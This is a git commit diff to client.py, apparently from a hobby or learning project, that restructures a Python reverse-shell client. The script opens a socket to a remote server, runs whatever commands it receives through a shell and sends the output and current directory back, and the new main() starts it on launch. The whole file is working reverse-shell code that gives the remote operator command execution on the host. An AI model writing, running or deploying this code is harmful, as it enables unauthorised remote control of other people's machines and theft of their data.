97c567a227d6642b1ecde4ac96de8dc7701e5417
asjadbut <asjadb18@gmail.com>
2021-07-27 13:06:17 +0500

    Final retouching

--- client.py
+++ client.py
@@ -16,13 +16,22 @@ def connect_socket():
     print("connecting socket with ip: {} at port: {}".format(server,str(port)))
     s.connect((server,port))
 
-while True:
-    data = s.recv(1024)
-    if data[:2].decode("utf-8") == "cd":
-        os.chdir(data[3:].decode("utf-8"))
-    if len(data) > 0 and (not(data[:2].decode("utf-8") == "cd")):
-        client_response = subprocess.Popen(data.decode("utf-8"),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-        output_byte = client_response.stdout.read() + client_response.stderr.read()
-        output_str = output_byte.decode("utf-8")
-        currentWD = os.getcwd()
-        s.send((output_str + currentWD).encode())
+def recv_cmds_send_response():
+
+    while True:
+        data = s.recv(1024)
+        if data[:2].decode("utf-8") == "cd":
+            os.chdir(data[3:].decode("utf-8"))
+        if len(data) > 0 and (not(data[:2].decode("utf-8") == "cd")):
+            client_response = subprocess.Popen(data.decode("utf-8"),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+            output_byte = client_response.stdout.read() + client_response.stderr.read()
+            output_str = output_byte.decode("utf-8")
+            currentWD = os.getcwd()
+            s.send((output_str + currentWD).encode())
+
+def main():
+    create_socket()
+    connect_socket()
+    recv_cmds_send_response()
+
+main()
